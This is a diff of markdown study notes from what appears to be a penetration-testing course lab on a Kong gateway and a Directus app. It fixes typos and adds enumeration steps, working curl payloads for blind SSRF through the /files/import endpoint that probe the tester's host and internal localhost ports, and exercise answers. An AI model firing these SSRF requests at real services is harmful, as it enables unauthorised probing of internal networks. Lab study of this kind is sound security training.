@@ -5,7 +5,7 @@ Many development teams have moved from monolithic web apps to smaller "micro" we
 
 ![image](https://user-images.githubusercontent.com/99839823/222589799-18527f6a-b236-4e2d-9654-bb79e8195965.png)
 
-Microservices privde the basic required functionality without dependencies.  
+Microservices provide the basic required functionality without dependencies.  
 
 Microservices are often run in containers and must intercommunicate. Containers and their IPs are ephemeral, so they often use DNS for discover. 
 
@@ -56,7 +56,7 @@ curl -i http://apigateway:8000
 
 The server responds with kong/2.2.1. Looking at google we can see that the admin API runs on port 8001.  
 
-A connnection to this is refused. We'll come back to it later. 
+A connection to this is refused. We'll come back to it later. 
 
 Lets use feroxbuster to enumerate endpoints running on port 8000
 ```bash
@@ -73,7 +73,7 @@ I get these results in Burp Suite intruder. Sort by status code. There are four 
 
 Look through all the results. There is an X-Powered-By header that indicates it is a Directus application. 
 
-There seems to be three disctinct endpoints: files, users, and render.
+There seems to be three distinct endpoints: files, users, and render.
 
 ### Advanced Enumeration with Verb Tampering
 See `route_buster.py`
@@ -94,3 +94,48 @@ SSRF can be especially effective against microservices, due to bypassing the sec
 ### SSRF Discovery
 
 Always check *url* parameters in an API or web form for an SSRF vulnerability. 
+
+Send payload and try to request file from local machine:
+
+```bash
+curl -i -X POST -H "Content-Type: application/json" -d '{"url":"http://192.168.119.138/ssrftest"}' http://apigateway:8000/files/import
+```
+
+check apache log on kali: 
+```bash
+sudo tail /var/log/apache2/access.log
+```
+This is an unauthenticated blind ssrf vuln
+
+## Source Code Analysis
+**Extra Mile**
+Review the source code for `/users/invite`. Determine why it cannot be exploited.
+
+**My answer:**
+On line 96 the *.verify* function is used on the java web token. 
+
+## Exploiting Blind SSRF in Directus
+Since we get different results based off if the resource is there or not we can infer whether a resource exists.
+We get 403 forbidden for a valid resource and 500 internal server error for a resource that doesn't exist.
+
+Try to access ports running on target localhost: 
+```bash
+curl -i -X POST -H "Content-Type: application/json" -d '{"url":"http://localhost:8000/"}' http://apigateway:8000/files/import
+```
+
+If Directus is running on a different server behind the gateway, then "localhost" would refer to the server running Directus, not the server running Kong API Gateway. 
+
+Default port for directus is 8055. 
+```bash
+curl -i -X POST -H "Content-Type: application/json" -d '{"url":"http://localhost:8055/"}' http://apigateway:8000/files/import
+```
+
+#### Exercises
+1. Repeat the steps above.
+2. Use the SSRF vulnerability to access a non-HTTP service running on your Kali host. What is the result? How might this be useful?
+3. Try to identify more error messages. What happens if you request an invalid IP address?
+#### Answers
+1. Done
+2. I started SSH server and checked that I could enumerate that. 
+3. Invalid IPs give an appropriate error message. 
+
